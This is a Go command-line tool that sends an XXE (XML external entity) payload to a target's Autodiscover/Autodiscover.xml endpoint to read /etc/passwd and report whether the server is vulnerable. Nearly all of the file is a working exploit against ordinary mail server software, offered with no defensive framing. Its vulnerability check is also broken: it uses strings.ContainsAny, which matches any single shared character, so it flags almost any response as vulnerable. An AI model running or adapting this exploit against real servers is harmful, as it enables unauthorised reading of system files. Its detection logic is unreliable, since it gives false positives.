package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	"zaber/src/interface"

	"github.com/fatih/color"
	"github.com/jessevdk/go-flags"
)

func error(err interface{}) {

	if err != nil {
		log.Fatalln(err)
		os.Exit(0)
	}
}

func main() {
	ui.GetBanner()

	var opts struct {
		Url string `short:"u" long:"url" description:"Definition: Argument used to pass target URL" required:"true"`
	}

	_, err := flags.Parse(&opts)
	error(err)

	TargetConnect(opts.Url)
}

func TargetConnect(url string) {

	connectMsg := color.New(color.FgYellow).Add(color.Bold)
	statuscodeMsg := color.New(color.FgGreen).Add(color.Bold)

	connectMsg.Println("[!] Connecting to", url)
	
	res, err := http.Get(url)
	error(err)

	statuscodeMsg.Println("[+] Got status code:", res.StatusCode)

	ReadPasswd(url)
}

func ReadPasswd(url string) {

	xmlFilePath := fmt.Sprintf("%s/Autodiscover/Autodiscover.xml", url)

	checkXXEMsg := color.New(color.FgYellow).Add(color.Bold)
	checkXXEMsg.Println("[!] Checking if target is vulnerable to XXE exploit...")

	xxePayload := `
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>
	`

	res, err := http.Post(xmlFilePath, "application/xml", strings.NewReader(xxePayload))
	error(err)
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	bodyResponse := string(body)

	vulnMsg := color.New(color.FgGreen).Add(color.Bold)
	notVulnMsg := color.New(color.FgRed).Add((color.Bold))
	
	passwdFile := strings.ContainsAny("/bin/bash", bodyResponse)

	if(passwdFile) {
		vulnMsg.Println("[+] Target is vulnerable to XXE!")
	} else {
		notVulnMsg.Println("[-] Target is not vulnerable to XXE...")
	}
}